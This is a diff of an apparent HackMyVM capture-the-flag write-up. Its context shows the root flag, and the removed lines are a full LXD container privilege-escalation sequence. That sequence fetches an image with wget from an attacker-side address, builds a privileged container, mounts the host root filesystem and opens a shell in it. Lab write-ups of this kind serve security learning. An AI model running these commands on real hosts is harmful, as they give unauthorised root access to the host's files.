@@ -197,24 +197,3 @@ lago  root.txt
 # cat root.txt
 HMV{eWVzIHlvdSBhcmUgY29vbA==}
 ```
-
-```
-find / -name lxc 2>/dev/null
-
-cd /tmp
-
-wget http://192.168.5.3/scripts/lin/lxc/alpine-v3.13-x86_64-20210218_0139.tar.gz
-
-/usr/bin/lxc image import /tmp/alpine-v3.13-x86_64-20210218_0139.tar.gz --alias lxcimage
-
-/usr/bin/lxc image list
-
-/usr/bin/lxc init lxcimage ignite -c security.privileged=true  # 这句话执行时会报错，提示先创建pool，就按照下面代码继续执行
-
-/usr/bin/lxc storage create pool dir
-/usr/bin/lxc profile device add default root disk path=/ pool=pool
-/usr/bin/lxc init lxcimage ignite -c security.privileged=true
-/usr/bin/lxc config device add ignite trenches disk source=/ path=/mnt/root recursive=true
-/usr/bin/lxc start ignite
-/usr/bin/lxc exec ignite /bin/sh
-```
